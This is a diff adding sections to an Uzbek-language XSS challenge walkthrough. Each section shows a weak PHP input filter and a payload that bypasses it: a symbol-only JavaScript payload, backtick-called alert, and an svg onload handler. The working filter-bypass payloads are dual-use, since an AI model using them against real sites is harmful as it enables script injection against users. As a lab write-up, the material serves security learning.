@@ -59,3 +59,43 @@ PHP xatosi:
 
 ![XSS Challange](./images/005-xss.png)
 
+# No Alphabets and Digits
+
+Ushbu qismga filter qo'shilgan:
+```$escaped = preg_replace("/[a-zA-Z0-9]/", "", $_GET['payload']);```
+Filter barcha harf va raqamlarni olib tashlaydi keyin natija to'g'ridan to'g'ri javascriptga saqlanadi.
+Shartlarga moslab belgilardan iborat payloaddan foydalanamiz:
+
+```([,하,,,,훌]=[]+{},[한,글,페,이,,로,드,ㅋ,,,ㅎ]=[!!하]+!하+하.ㅁ)[훌+=하+ㅎ+ㅋ+한+글+페+훌+한+하+글][훌](로+드+이+글+한+'("XSS")')()```
+
+![XSS Challange](./images/006-xss.png)
+
+# No Parentheses
+## Zaiflik turi: Reflected XSS
+
+Bundaham turlixil filterlardan foydalanilgan.
+```
+$escaped = preg_replace("/[()]/", "", $_GET['payload']);
+$escaped = preg_replace("/.*o.*n.*/i", "", $escaped);
+```
+
+Filter `/[()]/` va `/.*o.*n.*/i` bularni olib tashlaydi.
+
+Payload:
+```<script>alert`XSS`</script>```
+
+![XSS Challange](./images/007-xss.png)
+
+# No Quotes
+## Zaiflik turi: Reflected XSS
+
+Bu qismdaham filterdan foydalanilgan:
+
+```preg_replace("/['\"`&#]/", "", $_GET['payload']);```
+
+Filter ``/['\"`&#]/`` bularni olib tashlaydi.
+
+Payload:
+```<svg onload=alert(/XSS/)>```
+
+![XSS Challange](./images/008-xss.png)
